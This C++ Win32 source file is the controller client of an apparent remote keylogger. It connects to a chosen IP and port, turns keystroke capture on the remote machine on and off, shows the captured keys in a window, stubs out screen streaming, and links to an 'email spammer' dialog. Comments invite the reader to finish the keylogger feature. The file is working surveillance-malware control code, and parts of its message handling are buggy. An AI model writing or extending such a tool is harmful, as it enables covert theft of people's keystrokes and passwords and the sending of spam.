#include "project_client.h"
#include  "email.h"



map<string, CLIENT_MESSAGES> MESSAGEMAP;

struct sockaddr_in clientsocket;
SOCKET sa;
stringstream KEYLOG_STREAM;
char client_buffer[BUFFER_SZ];
string client_operator, client_operand;
string keylog = "Keylog window:\nfdf";

/*  Make the class name into a global variable  */
char szClassName[ ] = "KeyClient";
HWND g_hToolbar = NULL;


int WINAPI WinMain (HINSTANCE hThisInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR lpszArgument,
                     int nCmdShow)
{

    MESSAGEMAP["KEYLOG"] = KEYLOG;
    MESSAGEMAP["STREAMPICTURE"] = STREAMPICTURE;

    /*INITIALIZE WINSOCK*/
    WSADATA wsa;

          if (WSAStartup(MAKEWORD(2,2), &wsa)!=0)  {
                  //more error checking
                    int x = WSAGetLastError();
                    stringstream ss;
                    ss <<"Error: " << x << " From WSAGetLastError() From WSAStart() !";
                    MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);
            }

    HWND hwnd;               /* This is the handle for our window */
    MSG messages;            /* Here messages to the application are saved */
    WNDCLASSEX wincl;        /* Data structure for the windowclass */



    /* The Window structure */
    wincl.hInstance = hThisInstance;
    wincl.lpszClassName = szClassName;
    wincl.lpfnWndProc = WindowProcedure;      /* This function is called by windows */
    wincl.style = CS_DBLCLKS;                 /* Catch double-clicks */
    wincl.cbSize = sizeof (WNDCLASSEX);

    /* Use default icon and mouse-pointer */
    wincl.hIcon = LoadIcon(hThisInstance, MAKEINTRESOURCE(IDI_MYICON));
    wincl.hIconSm = LoadIcon(hThisInstance, MAKEINTRESOURCE(IDI_MYICON));
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = MAKEINTRESOURCE(IDR_MYMENU);
    wincl.cbClsExtra = 0;                      /* No extra bytes after the window class */
    wincl.cbWndExtra = 0;                      /* structure or the window instance */
    /* Use Windows's default colour as the background of the window */
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND;

    /* Register the window class, and if it fails quit the program */
    if (!RegisterClassEx (&wincl))
        return 0;

    /* The class is registered, let's create the program*/
    hwnd = CreateWindowEx (
           0,                   /* Extended possibilites for variation */
           szClassName,         /* Classname */
           "KeyClient",       /* Title Text */
           WS_OVERLAPPEDWINDOW|WS_BORDER, /* default window */
           CW_USEDEFAULT,       /* Windows decides the position */
           CW_USEDEFAULT,       /* where the window ends up on the screen */
           650,                 /* The programs width */
           480,                 /* and height in pixels */
           HWND_DESKTOP,        /* The window is a child-window to desktop */
           NULL,                /* No menu */
           hThisInstance,       /* Program Instance handler */
           NULL                 /* No Window Creation data */
           );

    /* Make the window visible on the screen */
    ShowWindow (hwnd, nCmdShow);


    /* Run the message loop. It will run until GetMessage() returns 0 */
    while (GetMessage (&messages, NULL, 0, 0)>0)
    {
        /* Translate virtual-key messages into character messages */
        TranslateMessage(&messages);
        /* Send message to WindowProcedure */
        DispatchMessage(&messages);
    }

    /* The program return-value is 0 - The value that PostQuitMessage() gave */
    return messages.wParam;
}


/*  This function is called by the Windows function DispatchMessage()  */

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{

    switch (message)                  /* handle the messages */
    {


       case WM_CREATE:{
           HINSTANCE hInstance = GetModuleHandle(NULL);
            CreateWindowEx(NULL, "BUTTON", "Send DialogBox", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 460 , 275, 150, 24, hwnd, (HMENU)MAIN_WINDOW_BUTTONMSG1, hInstance, NULL);
            CreateWindowEx(NULL, "BUTTON", "Connect To IP: ", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 25, 300, 150, 24, hwnd, (HMENU)CONNECT_TO_HOST, hInstance, NULL);
            CreateWindowEx(NULL, "EDIT", "IP_ADDRESS", WS_CHILD | WS_VISIBLE | WS_BORDER , 200, 300, 150, 24, hwnd, HMENU(IPADDR_EDIT), hInstance, NULL);
            CreateWindowEx(NULL, "EDIT", "PORT #", WS_CHILD | WS_VISIBLE | WS_BORDER, 360, 300, 75, 24, hwnd, HMENU(PORTNUMBER_EDIT), hInstance, NULL);
            CreateWindowEx(NULL, "BUTTON", "Disconnect", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 460, 300, 150, 24, hwnd, HMENU(DISCONNECT_HOST), hInstance, NULL);
            CreateWindowEx(NULL, "STATIC", "Status: Client Initialized! No errors so far!", WS_CHILD|WS_VISIBLE|SS_SUNKEN,25, 330, 585, 18, hwnd, HMENU(STATIC_STATUS_TEXT), hInstance, NULL);
            CreateWindowEx(NULL, "EDIT", "Keylog Window: ", WS_CHILD|WS_VISIBLE|ES_READONLY|ES_MULTILINE|WS_VSCROLL, 25, 350, 585, 65, hwnd, HMENU(KEYLOG_WINDOW), hInstance, NULL);
            CreateWindowEx(NULL, "button", "Keylogger On", WS_VISIBLE | WS_CHILD | BS_RADIOBUTTON, 25, 420, 115, 15, hwnd, HMENU(CHK_KEYLOG), hInstance, NULL);
            CreateWindowEx(NULL, "button", "Keylogger Off", WS_VISIBLE | WS_CHILD | BS_RADIOBUTTON, 145, 420, 120, 15, hwnd, HMENU(UNCHK_KEYLOG), hInstance, NULL);
        }
        break;

        case CLIENTMESSAGE_SYNC:{

            switch(LOWORD(lParam)){

                case FD_CLOSE:{
                     MessageBox(NULL, "ZOMG! The host disconnected for some odd reason!\nDid you kill the server?", "Socket Disconnected!", MB_OK | MB_ICONINFORMATION);
                     SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Disconnected.");
                }
                break;
                case FD_CONNECT: MessageBox(NULL, "Attempting connection!", "Attempting connection!", MB_OK | MB_ICONINFORMATION);
                break;
                case FD_WRITE:   SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Command Sent you stupid skid!");
                break;
                case FD_READ:{



                    //HINT HINT, Since the keylogger feature isnt implemented. Guess what? Implement it here.
                    //Whenever the server gets a read message, parse the message into a operator/operand like the server
                    //if the operator is  of Keylog or KG or whatever, then process it in a way which sends it to our KEY_LOG WINDOW
                    //That way we can differentiate between statuses and Keylogwindow!
                    //You can add other ways in which the server sends messages to client.
                    //This can be a great chat client as well!
                    client_operator = "", client_operand = "";

                        memset(&client_buffer[0], '\0', BUFFER_SZ);
                        HandleError(recv(sa, client_buffer,  BUFFER_SZ, NULL));

                         int forcount = 0;
                         for (; client_buffer[forcount] != '>'; forcount++){
                            client_operator += client_buffer[forcount];
                         }

                            //PARSE THE OPERAND
                        forcount++;
                        for (; client_buffer[forcount] != '<'; forcount++){
                            client_operand += client_buffer[forcount];
                        }

                        map<string, CLIENT_MESSAGES>::iterator i = MESSAGEMAP.find(client_operator);


                        switch(i->second){

                            case KEYLOG: {

                                keylog.append(client_operand);
                                //std::cout <<"\n" <<keylog;
                                SetDlgItemText(hwnd, KEYLOG_WINDOW, keylog.c_str());
                            }
                            break;

                            case STREAMPICTURE: //pic
                            break;

                            default: SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Message from server not recognized!");
                        }

                        SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Server processed message and executed!");

                        //SetDlgItemText(hwnd, KEYLOG_WINDOW, "Keylog Window: ");

                }
                break;

            }

        }

        case WM_COMMAND:

            switch(LOWORD(wParam)){
                case CHK_KEYLOG:{
                    CheckDlgButton(hwnd, CHK_KEYLOG, BST_CHECKED);
                    CheckDlgButton(hwnd, UNCHK_KEYLOG, BST_UNCHECKED);

                    HandleError(send(sa, "KEYLOG><", 8, 0));
                    //MessageBox(NULL, "Keylog", NULL, NULL);

                }
                break;

                case UNCHK_KEYLOG:{
                    CheckDlgButton(hwnd, UNCHK_KEYLOG, BST_CHECKED);
                    CheckDlgButton(hwnd, CHK_KEYLOG, BST_UNCHECKED);
                    //MessageBox(NULL, "stop Keylog", NULL, NULL);

                    HandleError(send(sa, "KEYLOGSTOP><", 13, 0));

                }
                break;

                case MAIN_WINDOW_BUTTONMSG1:{
                    DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_MSGBOXTRIG), hwnd, MsgBoxTrigger);
                }break;

                case DISCONNECT_HOST:{
                    HandleError(send(sa, "DISCONNECT><", 11, 0));
                    Sleep(1000);
                    HandleError(closesocket(sa));
                    MessageBox(NULL, "Disconnected from client!", "Socket Disconnected!", MB_OK | MB_ICONINFORMATION);

                }break;

                case CONNECT_TO_HOST:{

                    //Get length so we know how much to allocate in heap.
                    //Then use new operator to make room for the string. And then Get dialog text to fill the array.
                    //We then do whatever.
                    int iplen = GetWindowTextLength(GetDlgItem(hwnd, IPADDR_EDIT));
                    int portlen = GetWindowTextLength(GetDlgItem(hwnd, PORTNUMBER_EDIT));

                    char* ipbuff = new char[iplen+1];
                    char* portbuff = new char[portlen+1];

                    GetDlgItemText(hwnd, IPADDR_EDIT, ipbuff, iplen + 1);
                    GetDlgItemText(hwnd, PORTNUMBER_EDIT, portbuff, portlen+1);

                        string ipaddress(ipbuff);
                        int portnumber = atoi(portbuff);

                        sa = socket(AF_INET, SOCK_STREAM, 0);
                        HandleError(4);


                        clientsocket.sin_family = AF_INET;
                        clientsocket.sin_addr.s_addr = inet_addr(ipaddress.c_str());
                        clientsocket.sin_port = htons (portnumber);

                        WSAAsyncSelect(sa, hwnd, CLIENTMESSAGE_SYNC, FD_CONNECT|FD_READ|FD_WRITE|FD_CLOSE);


                        if (HandleError(connect(sa, (struct sockaddr *)&clientsocket, sizeof(clientsocket))) == SOCKET_ERROR){
                            break;
                        }else MessageBox(NULL, "Success! Client connected successfully!", "Success!", MB_OK | MB_ICONINFORMATION);

                        //char client_buffer[500];

                        //recv(sa, client_buffer, 500, 0);

                        //send(sa, "MESSAGE2>", 20, 0);

                        //send() directly? Or call a function()? Send a message?


                    delete []ipbuff;
                    delete []portbuff;




                }break;



                case ID_FILE_EXIT:
                      PostQuitMessage (0);
                    break;

                case IDM_ABOUT1:{

                    int ret = DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_ABOUT),hwnd, AboutDlgProc);

                    if (ret == IDOK){

                        MessageBox(hwnd, "Thanks for noticing the author!", "ty", MB_OK | MB_ICONINFORMATION);

                    }else if(ret == IDCANCEL){

                        MessageBox(hwnd, "Thanks for noticing the author!", "ty", MB_OK | MB_ICONINFORMATION);

                    }else if(ret == -1){

                        MessageBox(hwnd, "Dialog Failed!", "Error", MB_OK | MB_ICONINFORMATION);

                    }


                }
                break;

                case IDM_CONTACT:{

                        int ret = DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_EMAILME),hwnd, EmailMeDlg);

                    if(ret == -1){
                        MessageBox(hwnd, "Dialog Failed!", "Error", MB_OK | MB_ICONINFORMATION);\
                    }

                }
                break;

                case IDM_EMAIL_SPAMMER:

                    int ret = DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_ESPAMMER),hwnd, ESpamDlg);

                    if(ret == -1){

                        MessageBox(hwnd, "Dialog Failed!", "Error", MB_OK | MB_ICONINFORMATION);

                    }

                    break;

            }

        break;
        case WM_DESTROY:{
            WSACleanup();
            PostQuitMessage (0);       /* send a WM_QUIT to the message queue */

        }

        break;
        default:                      /* for messages that we don't deal with */
            return DefWindowProc(hwnd, message, wParam, lParam);
    }
        return 0;
}


//http://us.generation-nt.com/answer/getdlgitemfloat-help-26637032.html
//Grab a floating point string from the form. Used in the email spammer.
float GetDlgItemFloat(HWND hDlg, int id){

    TCHAR *pEnd;
    TCHAR szItemText[20];
    GetDlgItemText(hDlg, id, szItemText, 20);

    return (float)strtod(szItemText, &pEnd);
}


int HandleError(int error){

    if (error == SOCKET_ERROR){

        stringstream ss;
        ss <<"Error: " << WSAGetLastError() << " From WSAGetLastError() From WSAStart() !";
        MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);

    }else return 0;

    return SOCKET_ERROR;
}


